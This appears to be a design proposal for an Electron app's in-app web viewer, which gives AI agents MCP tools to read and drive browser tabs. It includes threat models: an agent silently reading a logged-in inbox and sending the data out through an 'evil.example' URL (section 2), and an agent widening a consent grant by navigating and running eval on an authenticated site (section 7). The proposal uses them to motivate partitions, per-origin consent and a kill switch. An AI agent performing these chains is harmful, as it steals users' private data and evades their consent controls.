# Native web viewer

Links from agent chat open as additional tabs in the center pane, rendered by a main-process
`WebContentsView`, with MCP tools that let an agent observe and drive a tab.

Status: proposal. Not implemented.

Survey and adversarial critique that produced this document are summarised in
"Evidence" at the end; every constraint below was verified against the tree at
`0a6e4b3d5`.

## 1. Decisions

| Decision | Value |
| --- | --- |
| Targets | localhost dev servers, deployed/preview URLs, docs links, **claude.com-hosted Claude artifacts** |
| Primitive | main-process `WebContentsView` (Electron 44.1.1) |
| Chrome | minimal — back / forward / reload / URL / open-in-OS-browser |
| Link routing | chat + transcript markdown links only; Cmd-click escapes to the OS browser |
| Tab scope | per session |
| Lifetime | URL list persisted per session; restored by re-navigating from scratch |
| Cookies | **two partitions** — persistent for human-opened tabs, ephemeral for agent-opened tabs |
| Agent observe | console, network, errors, DOM/text, screenshot |
| Agent drive | navigate, reload, back, click, type, evaluate JS |
| Consent | observe free on an agent's own tabs; drive and any read of a human tab prompt once per `(run, tab, committed origin)` |
| Agent-initiated opens | allowed, background only, never steals focus, marked `opened_by='agent'` |
| Capture storage | outside the repo, under the cyboflow data dir |
| Resources | only the visible tab paints; agent-pinned tabs stay loaded; ~6 loaded views per session, LRU-destroy |
| Global assistant rail | **out of scope for v1** |
| LiveCanvasEmbed | **left alone in v1**; convergence is follow-up work |

### Why `WebContentsView` and not an iframe

Measured 2026-09-23: `claude.ai` → `x-frame-options: SAMEORIGIN`; `github.com` → `deny`;
`docs.anthropic.com` → `SAMEORIGIN`. All three named targets refuse framing. Independently,
the packaged renderer CSP (`frontend/vite.config.ts:68`) sets
`frame-src 'self' blob: http://localhost:* http://127.0.0.1:*` and `cspPlugin` is
`apply: 'build'`, so an iframe viewer would work in `pnpm dev` and silently fail in every
shipped build. `webviewTag` is off and upstream-discouraged. Nothing of this kind exists in
the repo today: zero `WebContentsView`, `BrowserView` or `<webview>`; every current embed is
a loopback-only iframe.

## 2. Two partitions

The single shared partition originally proposed admits a zero-click exfiltration chain that
needs no drive grant at all: agent opens `https://mail.google.com` in the background (the
user sees only a tab-strip row) → `read_web_tab(include:['text'])` returns the authenticated
inbox → agent opens `https://evil.example/?d=<data>`, which is http(s) and so passes the only
URL policy. Splitting the jar removes the first step rather than gating the third.

- `persist:cyboflow-web-viewer` — tabs the **human** opened. Holds logins. An agent reading
  DOM/text/screenshot from one of these needs a consent grant.
- an **ephemeral** partition — tabs an **agent** opened. No logins, wiped on quit. Agent
  observe here is free, which keeps the common case (its own dev server, a docs page,
  a preview URL) frictionless.

A tab's partition is fixed at creation from `opened_by` and never changes. An agent
navigating its own tab to an authenticated origin therefore lands there logged out.

## 3. Architecture

### 3.1 Main process — `main/src/services/webViewer/`

- `webViewerManager.ts` — `Map<tabId, WebContentsView>`; create / navigate / back / forward /
  reload / destroy; attach to and detach from `mainWindow.contentView`; bounds; visibility;
  LRU. Takes a `getMainWindow: () => BrowserWindow | null` **accessor**, never a captured
  reference (precedent: `setupEventListeners(services, getMainWindow)`), and reaps on
  `mainWindow.on('closed')` — macOS re-creates the window on dock activate, which would
  otherwise orphan the map and leak live remote `webContents`.
- `webViewerGuard.ts` — pure, Electron-free navigation and scheme policy, unit-testable
  (precedent: `main/src/ipc/artifactFrameGuard.ts`). http/https only; popups become a new
  viewer tab or an OS-browser open, never a real popup window.
- `webViewerTelemetry.ts` — per-tab bounded ring buffers with a monotonic cursor.
- `webViewerDriver.ts` — CDP via `webContents.debugger`, for drive and heavy reads only.
- `webViewerConsent.ts` — grants keyed `(runId, tabId, committedOrigin)`.
- `main/src/webViewerComposition.ts` — boot wiring. `index.ts` has ~40 lines of ratchet
  headroom; precedent `verifyComposition.ts` / `evalComposition.ts`.

**webPreferences** for every viewer view: no preload, `nodeIntegration:false`,
`contextIsolation:true`, `sandbox:true`, the partition chosen per §2, plus
`disableDialogs: true` (`alert`/`confirm` from a remote page would otherwise block the app;
it overrides `safeDialogs`, so do not set both) and
`autoplayPolicy: 'document-user-activation-required'`.

**Partition hardening**, on each of the two sessions:
`setPermissionCheckHandler((_wc, p) => ALLOWED.has(p))` returning a boolean, and
`setPermissionRequestHandler((_wc, _p, cb) => cb(false))` which returns `void` and answers
through its callback — the two handlers have different shapes and a boolean returned from the
request handler grants nothing. `ALLOWED` is empty in v1. Also set
`setDevicePermissionHandler` and `setDisplayMediaRequestHandler`; the deny set must cover
`fileSystem`, `openExternal` and `display-capture`, not just camera/mic/geolocation.
`will-download` → cancel in v1.

### 3.2 Telemetry does not ride CDP

Two in-repo facts kill an always-on CDP session. `main/src/menu.ts:34` ships
`{ role: 'toggleDevTools' }` with its default accelerator, and a role-based item acts on the
**focused** `webContents` — once the user clicks into the viewer, one keystroke detaches the
debugger permanently (`electron.d.ts:7520` documents exactly this). And `pnpm dev` appends
`--remote-debugging-port=9223` (`scripts/dev-electron.mjs:34`), which `docs/AGENT-GUIDE.md`
names as the primary way to drive the UI — an external CDP client is already attached to the
same targets.

So the always-on buffers come off non-detachable surfaces:

| Signal | Source |
| --- | --- |
| console + uncaught errors | `webContents.on('console-message')` — in Electron 44 the payload carries `frame: WebFrameMain`, so it is WebContents-wide, subframes included, with frame attribution for free |
| navigation | `did-start-navigation`, `did-navigate` |
| load failures | `did-fail-load` |
| crashes | `render-process-gone` |
| network | `session.fromPartition(...).webRequest.onCompleted` / `.onErrorOccurred` — browser-process, covers every frame |

`debugger.attach()` is reserved for DOM snapshot, `Runtime.evaluate`, screenshot and `Input`.
It is attached lazily, guarded by `isAttached()` inside try/catch (`attach()` has no
idempotent form and throws on a second call), with a per-tab
`debugger.on('detach', …)` that stamps the telemetry cursor so a later read reports an
explicit gap and reason instead of silently returning nothing.

Network telemetry stores URL / status / timing / failure text only, through a **redacting
allowlist writer** that is the single writer into the ring buffer — raw CDP and raw
`webRequest` headers carry `Cookie`, `Set-Cookie` and `Authorization`. Where the CDP Network
domain is enabled at all, pass
`{ maxTotalBufferSize: 0, maxResourceBufferSize: 0, maxPostDataSize: 0 }` so Chromium retains
no response bodies of its own.

### 3.3 Out-of-process iframes

A Claude artifact renders in a cross-origin sandboxed iframe with its own origin, which
Chromium puts in its own renderer process. A session attached to the top-level `WebContents`
receives no `Runtime.consoleAPICalled`, no `Log.entryAdded` and no `Network.*` from it, and
`DOM.getDocument` / `Runtime.evaluate` cannot reach into it. `Input.dispatch*Event` **is**
routed by hit-testing and does reach an OOPIF — so without this section drive appears to work
while observe silently returns nothing, which is the worst failure shape for a debugging tool,
on the single use case the user named as most common.

- Console and network are frame-agnostic already (§3.2). Every ring-buffer entry stores
  `frame.url` / `frame.origin` so an agent can tell wrapper from artifact.
- DOM / text / evaluate iterate `webContents.mainFrame.framesInSubtree` and call
  `frame.executeJavaScript(...)` per frame, tagging each result with
  `frameToken` / `url` / `origin` / `processId`.
- Where CDP is genuinely needed, use flattened multi-session:
  `Target.setAutoAttach({autoAttach:true, flatten:true, waitForDebuggerOnStart:true})`,
  **re-issued on every newly attached child session** (flatten does not recurse); on
  `Target.attachedToTarget` enable the domains on that `sessionId` and only then
  `Runtime.runIfWaitingForDebugger`, which is what captures the artifact's startup errors;
  route by the `sessionId` argument on both `debugger.on('message', …)` and `sendCommand`;
  invalidate cached frame handles on `Target.detachedFromTarget`, since an OOPIF's
  `sessionId` changes on cross-process navigation.
- `cyboflow_read_web_tab` and `cyboflow_drive_web_tab` take a `frame` selector (default: top
  frame; `'all'`, or a frame token). The consent gate keys on the **frame's** origin.

### 3.4 Suspension, and the agent pin

Navigating a background tab to `about:blank` would blank exactly the state requirement (2)
exists to report: an agent-opened tab is background by definition, so every observe call would
return `about:blank`'s DOM, a blank screenshot and an empty delta.

Separate *paints* from *is loaded*:

- Background tab → `view.setVisible(false)` and/or `contentView.removeChildView(view)`. The
  document, its JS context, its listeners and its ring buffers stay alive. **Suspension never
  changes a tab's committed URL** — pin this as a unit test.
- An **agent pin** exempts a tab from unloading: set while the tab was agent-opened, or any
  agent has read its telemetry within 10 minutes, refreshed on each read. A pinned view is
  created and `loadURL`'d but not added to `contentView` — parking it inside the window at
  off-screen bounds would reintroduce the paint burn, because a `webContents` "displayed in"
  the window forces frames to be drawn and swapped for the whole window.
- The ~6 cap governs how many **loaded** views are retained; beyond it, LRU-**destroy** —
  a destroyed tab is just a URL row, re-navigated on demand. Pinned tabs are not evicted.
- Do not call `setBackgroundThrottling(true)`: it is already the Electron default, so the call
  buys nothing. If a hidden view still burns CPU (the `LiveCanvasEmbed.tsx:109-117`
  MacWebContentsOcclusion note is about a hidden *window*, unverified for a hidden child
  view — measure with `pnpm dev:perf`), freeze via CDP
  `Page.setWebLifecycleState({state:'frozen'})`, reversible with `'active'`.
- Every MCP tool returns an explicit `state: 'live' | 'hidden' | 'evicted'` plus the current
  committed URL, so an agent can never mistake a suspended tab for a blank page. A read of an
  `'evicted'` tab re-navigates and waits for load — that is not a focus change, so it does not
  violate "never steals focus".

### 3.5 tRPC, not `ipcMain`

`noNewIpcHandlers.test.ts` freezes per-file `ipcMain.handle` counts, so the renderer↔main
surface is a router at `main/src/orchestrator/trpc/routers/webViewer.ts`: `open`, `navigate`,
`back`, `forward`, `reload`, `close`, `setBounds`, `setVisible`, `list`, plus subscriptions
`onTabState` and `onTelemetryCount`.

**The layering constraint is wider than the original plan assumed.**
`main/eslint.config.js:37` applies `no-restricted-imports` at **error** level to
`src/orchestrator/**/*.ts`, banning `electron` and `**/services/**` with three frozen
exemptions, backstopped by
`main/src/orchestrator/__tests__/standaloneInvariant.test.ts` (which also catches dynamic
`require`/`await import`). That covers the tRPC router, `mcpQueryHandler.ts`, **and** the new
MCP handler module — none of them may value-import the manager, the driver, or `electron`.

Seams, as plain structural interfaces, in
`main/src/orchestrator/trpc/contracts/webViewerOps.ts` (the current precedent for tRPC context
seams — `configOps`, `sessionGitOps`, …):

- `WebViewerLike` — open / navigate / back / forward / reload / close / setBounds / setVisible / list
- `WebViewerTelemetryLike` — read a bounded delta since a cursor
- `WebViewerDriverLike` — drive verbs plus dom / text / screenshot capture

Typed structurally, e.g. `evaluate(tabId, expression): Promise<{ok: boolean; value?: unknown}>`
and `screenshot(tabId): Promise<{path: string}>`. Never surface `Electron.Debugger` across the
seam. Wire concretely from `webViewerComposition.ts`. Wire shapes the renderer needs go in
`shared/types/webViewer.ts`, which is compiled into the Vite renderer and must stay
Electron-free.

### 3.6 Renderer

- `shared/types/centerPane.ts` — `TabKind` gains `'web'`; `TabItem` gains `initialUrl`,
  `currentUrl`, `openedBy`.
- **Tab identity is an opaque uuid**, not `webTabId(url)`. Every existing helper
  (`fileTabId`, `artifactTabId`, `approvedDesignTabId`) keys on something immutable; a web
  tab's URL changes on the first click. `openWebTab` mints `web:${crypto.randomUUID()}`
  renderer-side (precedent: `customViewsStore.ts:280`) and passes it **into**
  `webViewer.open({tabId, url})`, so the action stays synchronous like its siblings. That one
  id is the correlation key across `TabItem.id`, the manager's map, `session_web_tabs.id` and
  the handle the MCP tools address, and it is **reused verbatim on restore** — re-minting
  would orphan grants, cursors and persisted position. `currentUrl` and `title` are rewritten
  on `did-navigate` / `page-title-updated`.
- Both `RunCenterPane.tsx:239` and `QuickSessionCenterPane.tsx:140` `renderActiveTab()` need a
  `'web'` arm. Missing the QuickSession copy renders the flow canvas for links from quick
  chats — the likeliest source.
- `CenterPaneTabStrip.tsx:50 edgeColor` and `:58 tabGlyph` both fall through to the artifact
  branch, so an unhandled kind renders silently mis-styled. **No favicon in v1**: the strip is
  text glyphs by design, and the packaged CSP's `img-src` would block a remote favicon — the
  exact dev/packaged asymmetry this document warns about. Use a glyph and drop `favicon` from
  the `onTabState` payload. Page-supplied titles are truncated and never interpreted as markup.
- `WebViewTab.tsx` — minimal chrome plus a **bounds anchor div**; the page is the native view
  painted over that rect.
- `useWebViewBounds.ts` — ResizeObserver, rAF-throttled. **Scale in main, not the renderer:**
  `setBounds` is DIP-relative while `getBoundingClientRect` is renderer CSS px, so the manager
  multiplies the supplied rect by `mainWindow.webContents.getZoomFactor()` and rounds. Do not
  derive zoom from `devicePixelRatio` — that is zoomFactor × display scaleFactor.
- **Keyboard**: a focused native view kills every renderer shortcut and Escape handler. On
  each viewer `webContents`, `before-input-event` gated to `input.type === 'keyDown'` resolves
  the reserved chords **in main** against `AppConfig.keyboardShortcuts` via
  `resolveAllShortcuts` / `eventMatchesBinding` from `shared/types/keyboardShortcuts.ts`
  (renaming Electron's `meta`/`control`/`alt`/`shift` to the `ShortcutMatchEvent` shape), and
  pushes a **semantic action** to the renderer — never a synthetic key event. Same commit adds
  a `context-menu` handler (copy / copy link / reload / open in browser).

### 3.7 Occlusion

A native view paints above all DOM. The counter is single; the wiring is not — 29 `.tsx`
files carry their own `z-20..z-50` overlay and only 3 import `ui/Modal` or `ui/Dropdown`, so
there is no common ancestor to instrument. Split into two commits:

- **4a, central hooks (6 edits, most call sites):** `ui/Modal.tsx`, `ui/Dropdown.tsx`,
  `ConfirmDialog.tsx` (hand-rolls its own scrim but has 23 importers),
  `contexts/ContextMenuContext.tsx` (the only thing positioning a `fixed z-50` menu at cursor
  coords), `hooks/useResizable.ts` and `hooks/useResizablePanel.ts` (increment for a drag;
  these back every resize site).
- **4b, residual one-offs, enumerated:** `App.tsx:515`, `AboutDialog`, `BugReportDialog`,
  `NimbalystInstallDialog`, `RunScriptConfigDialog`, `ArmDismissGuardDialog`,
  `ExperimentCancelDialog`, `DraggableProjectTreeView`, `DesignModeSurface`,
  `OnboardingModalCard`, `OnboardingOverlay`, `OnboardingSpiralReveal`, `GuidedLeader`,
  `CombinedDiffView`.

## 4. Link routing

`MarkdownPreview.tsx:101-105` **already** overrides `a` inside the module-scope
`MARKDOWN_COMPONENTS` map, with `target="_blank" rel="noopener noreferrer"` and no `onClick`;
the escape happens in main at `index.ts:1351` via `setWindowOpenHandler` →
`isSafeExternalOpenTarget` → `shell.openExternal`, **not** through a renderer `openExternal`
IPC channel. So this is an **edit to that existing entry**, not a new one — a second `a:` key
is a `no-dupe-keys` lint error. The map must stay module-scope (hoisting comment at :18-25) or
every transcript re-render re-parses all markdown, so the entry consults a
`WebLinkContext` whose default is `null` → today's behaviour. Chat surfaces
(`MessageSegment` / `ChatTranscript`) wrap in a provider.

This is the single ReactMarkdown call site in the renderer, so a regression there hits every
markdown surface in the app — scope the review accordingly. `MarkdownPreview` is **not**,
however, the only place a user sees a URL: plain-text (non-markdown) URLs and xterm output are
not linkified at all today. v1 covers markdown links only; `@xterm/addon-web-links` is an
installed-but-never-imported dependency and wiring it is real work, not a config flip.

The href reaching `openWebTab` is not guaranteed to be an absolute http(s) URL — resolve and
scheme-check before opening, and fall back to the existing external path otherwise.
Cmd/Ctrl-click, middle-click and a context-menu item bypass to the OS browser.
`isSafeExternalOpenTarget` is untouched.

## 5. Persistence

Migration — **`145_session_web_tabs.sql`**. On-disk highest is 143 and 144 is already claimed
by an unmerged worktree; re-check immediately before merge, because the ledger tracks by
filename and a renumbered file re-applies wholesale.

```sql
CREATE TABLE IF NOT EXISTS session_web_tabs (
  id             TEXT PRIMARY KEY,
  session_id     TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
  initial_url    TEXT NOT NULL,
  current_url    TEXT,
  title          TEXT,
  position       INTEGER NOT NULL,
  opened_by      TEXT NOT NULL CHECK (opened_by IN ('user','agent')),
  created_at     TEXT,
  last_active_at TEXT
);
CREATE INDEX IF NOT EXISTS idx_session_web_tabs_session
  ON session_web_tabs(session_id, position);
```

`IF NOT EXISTS` is mandatory, not stylistic: `scripts/verify-schema-parity.js` replays every
migration **after** applying `schema.sql`, and its per-migration catch tolerates only
`no such table|column` and `duplicate column name` — a bare `CREATE TABLE` raises
`table … already exists`, which re-throws and fails `test:unit`.

**Do not mirror the table into `schema.sql`.** A new table reaches both parity paths through
the migration alone; `schema.sql` declares only 8 legacy tables, and `ideas` / `epics` /
`tasks` / `review_items` / `artifacts` are all migration-only. The dual-source rule in
`migrations/AGENTS.md` is about *column* changes to tables `schema.sql` already declares. Note
also that `verify:schema`'s signature compares columns and foreign keys only — it does **not**
check CHECK constraints or indexes, so it is not a proof of the whole table shape.

DB methods go in a new `main/src/database/webTabsRepository.ts`; `database.ts` has ~54 lines of
ratchet headroom and should not spend it here. `session_web_tabs` is not one of the four
chokepoint tables, so no router is required — but if a capture is ever surfaced as a
deliverable it must go through `ArtifactRouter.apply`, and a finding through `ReviewItemRouter`.

Restore creates tabs **unloaded**; the tab strip shows the persisted `title` (falling back to
the hostname) until first focus or an agent pin loads it.

## 6. MCP tools

Declared once via `defineTool` in `toolRegistry/runScopeTools.ts`; run scope only in v1
(matching the deferred rail). Never a case-arm or `inputSchema` literal in
`cyboflowMcpServer.ts`.

| Tool | Envelope | Purpose |
| --- | --- | --- |
| `cyboflow_web_tabs` | `mcp-web-tabs` | list this session's tabs with `state` and `openedBy` |
| `cyboflow_read_web_tab` | `mcp-read-web-tab` | telemetry delta since a cursor; optional `include: ['dom'\|'text'\|'screenshot']`, optional `frame` |
| `cyboflow_open_web_tab` | `mcp-open-web-tab` | background open in the ephemeral partition, `opened_by='agent'` |
| `cyboflow_drive_web_tab` | `mcp-drive-web-tab` | navigate / back / forward / reload / click / type / eval; blocks on consent |

**Envelope names must be kebab-case, lowercase-and-hyphen only** — no underscores, no digits.
`toolRegistryRatchet.test.ts:99,109` discovers envelopes by `/case ['"]([a-z-]+)['"]:/` and
`/type: ['"]([a-z-]+)['"];/`, so an underscored envelope is invisible to the scan and fails
the gate. Do not mirror the underscored tool names.

Handlers live in `main/src/orchestrator/mcpServer/handlers/webViewerToolHandlers.ts`
(precedent `verifyToolHandlers.ts`), subject to the `orchestrator/**` import ban of §3.5.

**Ratchet arithmetic.** `mcpQueryHandler.ts` is at 4543/4543, and
`fileSizeRatchet.test.ts:80-91` carries a *second* assertion — `cap <= floor(lines * 1.02)` —
so a standalone "extract to free headroom" commit banks nothing (all six historical cap
changes on this entry set the cap to the exact size). And `toolRegistryRatchet` pins the
`case` arms **inside** `handleMessage` in that exact file, so they cannot be relocated. The
commit that adds the arms must therefore carry its own offsetting extraction and lower the cap
to the new exact size in the same commit: *extract N lines, add ~30, net −(N−30), cap =
4543 − (N−30)*.

**`ompGateConfigBuilder` is a hard gate, not a silent one.**
`ompGateConfigBuilder.test.ts:71` asserts exact set equality between the hardcoded
`CYBOFLOW_MCP_TOOL_NAMES` and the union of the three registry scope tables, so a registry
entry with no matching name fails `test:unit` outright. Same commit, every time.

**Error contract.** There is no `code` field in this codebase; handlers reply
`{ok:false, error:'<snake_case_code>'}` or `'<code>: <detail>'`. Argument-shape failures are
already `invalid_arguments` from `defineTool.prepare`, so new codes cover only lifecycle:
`tab_not_found`, `tab_closed`, `tab_evicted`, `origin_changed`, `consent_denied`,
`consent_timeout`, `frame_not_found`, `viewer_disabled`.

**Captures go outside the repo** — under the cyboflow data dir, never into a worktree or the
run-artifacts root (this repo is public). The MCP reply carries a path pointer, never inline
bytes. Screenshot of a hidden tab goes through CDP with a forced-frame sequence
(`Emulation.setDeviceMetricsOverride` → `Page.captureScreenshot` →
`Emulation.clearDeviceMetricsOverride`); `capturePage()` on a non-painting composited view is
not a designed path, and the repo's own offscreen precedent
(`capturePageBackend.ts:482-492`) works only because it uses `offscreen: true` on a
`show:false` BrowserWindow, which a `WebContentsView` cannot do. If that sequence does not
yield a real frame on macOS, return `state:'hidden'` with no image rather than a blank PNG.

There is no server-push on this transport: observe is pull, drive is a blocking tool.

## 7. Consent and the kill switch

**Grant key is `(runId, tabId, committedOrigin)`, enforced at dispatch.** Keying on the tab
alone is escalation: approve drive on `localhost:5173` (an easy yes) → `navigate` to
`github.com` on the same tab → `eval` now runs in a github.com document with the user's
session, where same-origin authenticated `fetch` defeats HttpOnly entirely. Removing
`navigate` from the verb list does not help, because `eval` can set `location.href`. So every
privileged verb re-reads `new URL(webContents.getURL()).origin` immediately before dispatch
and fails closed on mismatch with `origin_changed`. Exact scheme+host+port match, no prefix
matching.

**The prompt reuses `QuestionRouter`** (`questionRouter.ts:477`), which is already callable
from main — `claudeCodeManager.routeAskUserQuestion` does so from a hook. The handler holds
the `runId`, so it raises the gate and awaits it, with the drive tool's `timeoutMs: null`.

**Audit trail**: every agent-initiated open, every grant, every drive verb and every
privileged read is logged per session and visible in the tab UI, with per-tab revocation.

**Kill switch.** Every comparably risky capability in this repo is gated by an
`AppConfig.<x>Enabled` flag enforced authoritatively in `ConfigManager` with the renderer
merely hiding UI (`assistantEnabled`, `codeReviewEvalEnabled`, `visualVerify`). Add to **both**
`AppConfig` (~`config.ts:214`, beside `visualVerify`) and `UpdateConfigRequest` (~`:366`) —
the repo keeps these in parity and a field missing from the second cannot be written:

```ts
webViewer?: { enabled?: boolean; agentObserve?: boolean; agentDrive?: boolean; persistLogin?: boolean }
```

Not seeded into constructor defaults; floors applied on read, so `config.json` stays
byte-identical for users who never touch it (mirror `ResolvedIdleSessionReviewConfig` /
`IDLE_SESSION_REVIEW_DEFAULTS`). Defaults: `enabled: true`, `agentObserve: false`,
`agentDrive: false`, `persistLogin: true`. **This lands before any capability commit.**

## 8. Interaction with the repo's own verification

Two real collisions, both new to "Known risks":

- `driverCore.ts:984` captures via Playwright `page.screenshot()`, a renderer-surface capture.
  A `WebContentsView` composites **above** the renderer DOM, so a CDP screenshot of a
  web-viewer tab shows the bounds-anchor rect **empty**. Any visual verification whose
  acceptance depends on seeing embedded page content must run under the `native-screen`
  modality.
- `driverCore.ts:888-912 ensurePage` picks the first non-devtools CDP page. An open viewer tab
  is another page on the same `:9223` endpoint, so the driver can attach to the embedded site
  instead of the cyboflow UI. Fix by positive selection: the `cdp-app` modality already
  carries `attestation: { kind: 'cdp-token', expression, expected }`; export it to the driver
  and select the page that satisfies it.

## 9. Test plan

Pure unit (no Electron): guard policy table; consent grant / revoke / origin-change rejection;
LRU eviction with pins; bounds rounding under zoom; ring-buffer capping and cursor semantics;
the redactor; **suspension never changes a committed URL**.

Existing gates this change must satisfy — note the last two, which the first draft missed:
`noNewIpcHandlers`, `ipcChannelRegistration`, `preloadInvokeAllowlist`, `fileSizeRatchet`,
`toolRegistryRatchet`, `migrationPrefixes`, `verify:schema`, `ompGateConfigBuilder`,
**`standaloneInvariant`**, and **`pnpm --filter main lint`** (eslint is error-level for the
import ban, not a warning).

Integration: MCP tool round-trip on the mocked-SDK harness.
E2E: a `WebContentsView` is not `app.firstWindow()` — assert via `app.evaluate()` over
`webContents.getAllWebContents()`. Keep `test:ci:minimal` (branch-protected) asserting only
the tab strip.
Manual: `CYBOFLOW_DIR=~/.cyboflow_test pnpm dev`, then a **packaged** build check — the
CSP/dev asymmetry is exactly the class dogfooding misses.

## 10. Commit staging

| # | Commit | Note |
| --- | --- | --- |
| 1 | `feat: webViewer config block + kill switch` | lands first; everything after is gated |
| 2 | `feat: 'web' TabKind + opaque ids + store action + strip glyph` | tab opens, placeholder body |
| 3 | `feat: main-process manager, guard, partitions, tRPC router, composition` | includes `before-input-event` forwarder and `context-menu` handler |
| 4a | `feat: occlusion counter — central hooks` | 6 edits |
| 4b | `feat: occlusion counter — residual overlays` | 14 enumerated sites |
| 5 | `feat: suspend/resume, agent pin, LRU` | |
| 6 | `feat: persist web tabs per session` | migration 145 |
| 7 | `feat: chat link routing via WebLinkContext` | edits the existing `a` override |
| 8 | `feat: telemetry ring buffers + redactor` | non-CDP sources |
| 9 | `feat: MCP observe tools` | carries its own `mcpQueryHandler` extraction + OMP names |
| 10 | `feat: consent gate + drive tools + audit trail` | |
| 11 | `fix: verify driver page selection via cdp-token attestation` | |
| 12 | `docs: ARCHITECTURE, SHELL-LAYOUT, CODE-PATTERNS` | SHELL-LAYOUT's navigation-store contract requires documenting any new App-level mount condition |

Every step is independently shippable: the feature is off by default until step 1's flags are
flipped, and each later step is inert behind them.

## 11. Known risks

- **`trpc-electron` patch tripwire.** `patches/trpc-electron@0.1.2.patch` exists because a
  subframe `did-start-navigation` aborted the main frame's tRPC subscriptions. A
  navigation-heavy embedded view re-enters that path. A `WebContentsView` is a separate
  `WebContents` rather than a subframe, so it may be unaffected — smoke-test explicitly.
  `pnpm patch` requires editing both `dist/main.cjs` and `dist/main.mjs`.
- Occlusion is a standing invariant a future overlay can break.
- Migration prefix collision with unmerged worktrees.
- Packaged-vs-dev asymmetry (CSP, favicon, capture).
- Windows bounds/DPI behaviour differs; `build:win` is Windows-host-only.
- Two viewers for a localhost dev server until `LiveCanvasEmbed` converges. When it does, the
  only branch to change is `else if (hasUrl && url)` in `CanvasBody`
  (`ArtifactTabRenderer.tsx:2626-2627`) — leave the `{html}` srcDoc arm alone, it is the
  opaque-origin path `ApprovedDesignTab` and `DesignStageCanvas` depend on.

## Evidence

A six-agent read-only survey mapped the center-pane tab model, chat link rendering, Electron
embedding precedent, the MCP tool surface, the visual-verification stack and the panel
substrate. A four-lens adversarial critique (Electron correctness, repo/CI compliance,
security, completeness) produced 55 findings against the first draft of this document; each
was independently verified against the tree, 46 confirmed and 9 refuted. Every confirmed
blocking and major finding is folded in above.
